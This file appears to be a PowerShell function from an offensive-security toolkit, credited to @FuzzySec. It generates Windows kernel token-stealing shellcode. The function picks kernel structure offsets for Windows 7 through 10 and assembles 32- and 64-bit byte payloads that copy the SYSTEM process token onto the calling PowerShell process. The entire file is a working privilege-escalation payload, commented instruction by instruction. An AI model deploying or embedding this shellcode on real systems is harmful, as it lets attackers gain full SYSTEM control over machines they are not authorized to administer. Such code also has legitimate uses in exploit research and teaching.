function Get-KernelShellCode {
<#
.SYNOPSIS
	Generate x32/64 Kernel token stealing shellcode.

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.EXAMPLE
	C:\PS> $ShellCode = Get-KernelShellCode
#>

	# Flag architecture $x32Architecture/!$x32Architecture
	if ([System.IntPtr]::Size -eq 4) {
		$x32Architecture = 1
	}

	# Set OS variables
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{
			if(!$x32Architecture){
				if($OSVersion.Build -lt 15063){
					$KTHREAD = 0x188 # gs:_KPCR->_KPRCB->_KTHREAD
					$EPROCESS = 0x220
					$UniqueProcessId = 0x2e8
					$TokenOffset = 0x358
					$ActiveProcessLinks = 0x2f0
				} else {
					$KTHREAD = 0x188
					$EPROCESS = 0x220
					$UniqueProcessId = 0x2e0
					$TokenOffset = 0x358
					$ActiveProcessLinks = 0x2e8
				}
			} else {
				if($OSVersion.Build -lt 15063){
					$KTHREAD = 0x124 # fs:_KPCR->_KPRCB->_KTHREAD
					$EPROCESS = 0x150
					$UniqueProcessId = 0xb4
					$TokenOffset = 0xf4
					$ActiveProcessLinks = 0xb8
				} else {
					$KTHREAD = 0x124
					$EPROCESS = 0x150
					$UniqueProcessId = 0xb4
					$TokenOffset = 0xfc
					$ActiveProcessLinks = 0xb8
				}
			}
		}
		
		'6.3' # Win8.1 / 2k12R2
		{
			if(!$x32Architecture){
				$KTHREAD = 0x188
				$EPROCESS = 0x220
				$UniqueProcessId = 0x2e0
				$TokenOffset = 0x348
				$ActiveProcessLinks = 0x2e8
			} else {
				$KTHREAD = 0x124
				$EPROCESS = 0x150
				$UniqueProcessId = 0xb4
				$TokenOffset = 0xec
				$ActiveProcessLinks = 0xb8
			}
		}
		
		'6.2' # Win8 / 2k12
		{
			if(!$x32Architecture){
				$KTHREAD = 0x188
				$EPROCESS = 0x220
				$UniqueProcessId = 0x2e0
				$TokenOffset = 0x348
				$ActiveProcessLinks = 0x2e8
			} else {
				$KTHREAD = 0x124
				$EPROCESS = 0x150
				$UniqueProcessId = 0xb4
				$TokenOffset = 0xec
				$ActiveProcessLinks = 0xb8
			}
		}
		
		'6.1' # Win7 / 2k8R2
		{
			if(!$x32Architecture){
				$KTHREAD = 0x188
				$EPROCESS = 0x210
				$UniqueProcessId = 0x180
				$TokenOffset = 0x208
				$ActiveProcessLinks = 0x188
			} else {
				$KTHREAD = 0x124
				$EPROCESS = 0x150
				$UniqueProcessId = 0xb4
				$TokenOffset = 0xf8
				$ActiveProcessLinks = 0xb8
			}
		}
	}

	if(!$x32Architecture){
		$Shellcode = [Byte[]] @(
			0x65, 0x4C, 0x8B, 0x0C, 0x25) + [System.BitConverter]::GetBytes($KTHREAD) + @( # mov r9,qword ptr gs:[188h]    _KPCR->_KPRCB->_KTHREAD
			0x4D, 0x8B, 0x89) + [System.BitConverter]::GetBytes($EPROCESS) + @(            # mov r9,qword ptr [r9+220h]    _EPROCESS
			0x49, 0xC7, 0xC0) + [System.BitConverter]::GetBytes($PID) + @(                 # mov r8,$PID                   Posh PID
			0x4C, 0x89, 0xC8,                                                              # mov rax,r9                    _EPROCESS
			0x48, 0x8B, 0x80) + [System.BitConverter]::GetBytes($ActiveProcessLinks) + @(  # mov rax,qword ptr [rax+2E8h]  RAX=ActiveProcessLinks  <-|
			0x48, 0x2D) + [System.BitConverter]::GetBytes($ActiveProcessLinks) + @(        # sub rax,2E8h                  RAX=EPROCESS+1            |
			0x4C, 0x39, 0x80) + [System.BitConverter]::GetBytes($UniqueProcessId) + @(     # cmp qword ptr [rax+2E0h],r8   UniqueProcessId -eq PID ? |
			0x75, 0xEA,                                                                    # jne                           |--------------------------
			0x48, 0x89, 0xC1,                                                              # mov rcx,rax                   RAX=RCX=EPROCESS
			0x48, 0x81, 0xC1) + [System.BitConverter]::GetBytes($TokenOffset) + @(         # add rcx,358h                  Posh proc token Ptr
			0x4C, 0x89, 0xC8,                                                              # mov rax,r9                    _EPROCESS
			0x48, 0x8B, 0x80) + [System.BitConverter]::GetBytes($ActiveProcessLinks) + @(  # mov rax,qword ptr [rax+2E8h]  RAX=ActiveProcessLinks  <-|
			0x48, 0x2D) + [System.BitConverter]::GetBytes($ActiveProcessLinks) + @(        # sub rax,2E8h                  RAX=EPROCESS+1            |
			0x48, 0x83, 0xB8) + [System.BitConverter]::GetBytes($UniqueProcessId) + @(0x04,# cmp qword ptr [rax+2E0h],4    UniqueProcessId -eq 4 ?   |
			0x75, 0xE9,                                                                    # jne                           |--------------------------
			0x48, 0x89, 0xC2,                                                              # mov rdx,rax                   RAX=RCX=EPROCESS
			0x48, 0x81, 0xC2) + [System.BitConverter]::GetBytes($TokenOffset) + @(         # add rdx,358h                  SYSTEM proc token Ptr
			0x48, 0x8B, 0x12,                                                              # mov rdx,qword ptr [rdx]       RDX=SYSTEM token
			0x48, 0x89, 0x11,                                                              # mov qword ptr [rcx],rdx       Overwrite Posh token
			0xC3                                                                           # ret
		)
	} else {
		$Shellcode = [Byte[]] @(
			0x64, 0xA1) + [System.BitConverter]::GetBytes($KTHREAD) + @(             # mov eax, dword ptr fs:[KTHREAD]
			0x8B, 0x80) + [System.BitConverter]::GetBytes($EPROCESS) + @(            # mov eax, [eax + EPROCESS]
			0xBB) + [System.BitConverter]::GetBytes($PID) + @(                       # mov ebx,$PID
			0x89, 0xC6,                                                              # mov esi,eax
			0x8B, 0xB6) + [System.BitConverter]::GetBytes($ActiveProcessLinks) + @(  # mov esi,dword ptr [esi+ActiveProcessLinks]
			0x81, 0xEE) + [System.BitConverter]::GetBytes($ActiveProcessLinks) + @(  # sub esi,ActiveProcessLinks
			0x39, 0x9E) + [System.BitConverter]::GetBytes($UniqueProcessId) + @(     # cmp dword ptr [esi+UniqueProcessId],ebx
			0x75, 0xEC,                                                              # jne
			0x89, 0xF1,                                                              # mov ecx,esi ECX=ESI=EPROCESS
			0x81, 0xC1) + [System.BitConverter]::GetBytes($TokenOffset) + @(         # Posh proc token Ptr+
			0x89, 0xC6,                                                              # mov esi,eax
			0x8B, 0xB6) + [System.BitConverter]::GetBytes($ActiveProcessLinks) + @(  # mov esi,dword ptr [esi+ActiveProcessLinks]
			0x81, 0xEE) + [System.BitConverter]::GetBytes($ActiveProcessLinks) + @(  # sub esi,ActiveProcessLinks
			0x83, 0xBE) + [System.BitConverter]::GetBytes($UniqueProcessId) + @(0x04,# cmp dword ptr [esi+UniqueProcessId],4
			0x75, 0xEB,                                                              # jne
			0x89, 0xF2,                                                              # mov edx,esi
			0x81, 0xC2) + [System.BitConverter]::GetBytes($TokenOffset) + @(         # add edx,TokenOffset
			0x8B, 0x12,                                                              # mov edx, dword ptr [edx]
			0x89, 0x11,                                                              # mov dword ptr [ecx],edx
			0xC3                                                                     # ret
		)
	}

	$Shellcode

}